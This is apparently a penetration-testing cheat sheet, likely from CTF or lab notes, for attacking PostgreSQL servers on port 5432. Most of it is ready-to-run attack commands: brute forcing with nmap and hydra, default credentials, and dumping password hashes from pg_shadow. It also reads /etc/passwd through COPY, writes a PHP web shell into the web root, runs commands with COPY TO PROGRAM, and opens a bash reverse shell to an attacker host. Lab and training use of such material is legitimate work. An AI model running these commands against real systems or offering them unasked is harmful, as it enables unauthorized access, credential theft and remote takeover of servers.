# PostgreSQL (5432)

!!! tip "Start here"
    Try connecting as `postgres` with no password: `psql -h 10.10.10.10 -U postgres`. Many installs use `postgres:postgres` or trust authentication for local-equivalent connections. If you get in, check if `COPY` is available — it gives you file read and write on the host OS.

---

## Enumeration

```bash
nmap -p 5432 --script pgsql-brute 10.10.10.10
```

---

## Authentication

```bash
psql -h 10.10.10.10 -U postgres
psql -h 10.10.10.10 -U postgres -W
```

Common credentials: `postgres:postgres`, `postgres:admin`, `admin:admin`

---

## Brute Force

```bash
hydra -L users.txt -P passwords.txt postgres://10.10.10.10
```

---

## Enumeration Queries

```sql
\list                                   -- list databases
\c database_name                        -- connect to database
\dt                                     -- list tables
SELECT version();                       -- PostgreSQL version
SELECT current_user;                    -- current user
SELECT usename, passwd FROM pg_shadow;  -- password hashes (superuser only)
```

---

## File Read / Write (COPY)

Read a file from the host:

```sql
CREATE TABLE tmp (content TEXT);
COPY tmp FROM '/etc/passwd';
SELECT * FROM tmp;
```

Write a file to disk:

```sql
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

---

## OS Command Execution (COPY TO/FROM PROGRAM)

Available in PostgreSQL 9.3+:

```sql
COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';
COPY tmp FROM PROGRAM 'id';
SELECT * FROM tmp;
```

Reverse shell:

```sql
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<attacker-ip>/9001 0>&1"';
```

---

## Privilege Check

```sql
SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;
```

!!! tip "Real-world"
    PostgreSQL is common in Linux environments and often runs as the `postgres` OS user. If you get RCE via `COPY TO PROGRAM`, you're executing as that user — check `sudo -l` immediately. Trust authentication (`pg_hba.conf`) misconfiguration is the most common finding: connections from `127.0.0.1/32` allowed without a password.
